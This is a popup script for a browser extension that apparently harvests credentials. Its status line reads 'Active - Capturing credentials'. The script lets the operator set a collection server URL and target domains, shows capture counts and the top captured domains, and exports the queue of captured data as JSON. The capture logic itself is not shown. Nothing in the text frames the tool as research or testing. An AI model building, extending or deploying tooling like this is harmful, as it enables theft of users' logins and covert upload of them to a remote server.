// Popup Script - Enhanced with Queue Export
document.addEventListener('DOMContentLoaded', async () => {
    await loadConfig();
    await loadStats();

    document.getElementById('enabledToggle').addEventListener('change', handleToggle);
    document.getElementById('saveBtn').addEventListener('click', saveConfig);
    document.getElementById('refreshBtn').addEventListener('click', loadStats);
    document.getElementById('exportBtn').addEventListener('click', exportQueue);
    document.getElementById('clearQueueBtn').addEventListener('click', clearQueue);
    document.getElementById('resetStatsBtn').addEventListener('click', resetStats);

    setInterval(loadStats, 5000);
});

async function loadConfig() {
    const config = await ConfigManager.load();

    document.getElementById('enabledToggle').checked = config.ENABLED;
    document.getElementById('serverUrl').value = config.SERVER_URL;
    document.getElementById('targetDomains').value = (config.CAPTURE_RULES && config.CAPTURE_RULES.TARGET_DOMAINS) ? config.CAPTURE_RULES.TARGET_DOMAINS.join('\n') : '';

    updateStatus(config.ENABLED);
}

async function saveConfig() {
    const config = await ConfigManager.load();
    const targetDomainsText = document.getElementById('targetDomains').value;
    const targetDomains = targetDomainsText.split('\n').map(d => d.trim()).filter(d => d.length > 0);

    const updates = {
        ...config,
        ENABLED: document.getElementById('enabledToggle').checked,
        SERVER_URL: document.getElementById('serverUrl').value.trim(),
        CAPTURE_RULES: {
            ...(config.CAPTURE_RULES || {}),
            TARGET_DOMAINS: targetDomains
        }
    };

    await ConfigManager.save(updates);
    showNotification('Settings saved successfully!', 'success');
}

async function loadStats() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'GET_STATS' });

        if (response && response.error) {
            document.getElementById('circuitStatus').textContent = response.error;
            return;
        }

        document.getElementById('captureCount').textContent = response.captureCount || 0;
        document.getElementById('successRate').textContent = (response.successRate || 0) + '%';
        document.getElementById('queueSize').textContent = (response.queue && response.queue.totalSize !== undefined) ? response.queue.totalSize : 0;

        if (response.lastCapture) {
            const date = new Date(response.lastCapture);
            document.getElementById('lastCapture').textContent = date.toLocaleTimeString();
        } else {
            document.getElementById('lastCapture').textContent = 'Never';
        }

        const domainsList = document.getElementById('topDomainsList');
        domainsList.innerHTML = '';

        if (response.topDomains && response.topDomains.length > 0) {
            response.topDomains.forEach(([domain, count]) => {
                const li = document.createElement('li');
                li.innerHTML = `<span>${domain}</span><span><strong>${count}</strong></span>`;
                domainsList.appendChild(li);
            });
        } else {
            domainsList.innerHTML = '<li>No captures yet</li>';
        }

        const circuitStatus = document.getElementById('circuitStatus');
        if (response.circuit) {
            const stateColor = {
                'CLOSED': '\uD83D\uDFE2',
                'OPEN': '\uD83D\uDD34',
                'HALF_OPEN': '\uD83D\uDFE1'
            };
            circuitStatus.innerHTML = `
                ${stateColor[response.circuit.state] || ''} Circuit: ${response.circuit.state}<br>
                <small>Failures: ${response.circuit.failureCount}</small>
            `;
        }

        const quotaStatus = document.getElementById('quotaStatus');
        if (response.quota) {
            const percent = response.quota.percentUsed.toFixed(1);
            const color = percent > 80 ? '#ef4444' : percent > 50 ? '#f59e0b' : '#10b981';
            quotaStatus.innerHTML = `
                <span style="color: ${color}">Storage: ${response.quota.usageMB}MB / ${response.quota.quotaMB}MB (${percent}%)</span>
            `;
        }
    } catch (error) {
        console.error('Failed to load stats:', error);
        document.getElementById('circuitStatus').textContent = 'Extension initializing...';
    }
}

function handleToggle(e) {
    updateStatus(e.target.checked);
    saveConfig();
}

function updateStatus(enabled) {
    const dot = document.getElementById('statusDot');
    const text = document.getElementById('statusText');

    if (enabled) {
        dot.className = 'status-indicator status-active';
        text.textContent = 'Active - Capturing credentials';
    } else {
        dot.className = 'status-indicator status-inactive';
        text.textContent = 'Disabled';
    }
}

async function exportQueue() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'EXPORT_QUEUE' });

        const blob = new Blob([JSON.stringify(response, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `queue-export-${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);

        showNotification('Queue exported successfully!', 'success');
    } catch (error) {
        showNotification('Export failed: ' + error.message, 'error');
    }
}

async function clearQueue() {
    if (confirm('Clear all queued items? This cannot be undone.')) {
        await chrome.runtime.sendMessage({ type: 'CLEAR_QUEUE' });
        showNotification('Queue cleared', 'success');
        await loadStats();
    }
}

async function resetStats() {
    if (confirm('Reset all statistics? This cannot be undone.')) {
        await chrome.runtime.sendMessage({ type: 'RESET_STATS' });
        showNotification('Statistics reset', 'success');
        await loadStats();
    }
}

function showNotification(message, type = 'success') {
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.textContent = message;

    if (type === 'error') {
        notification.style.background = '#ef4444';
    }

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.remove();
    }, 3000);
}
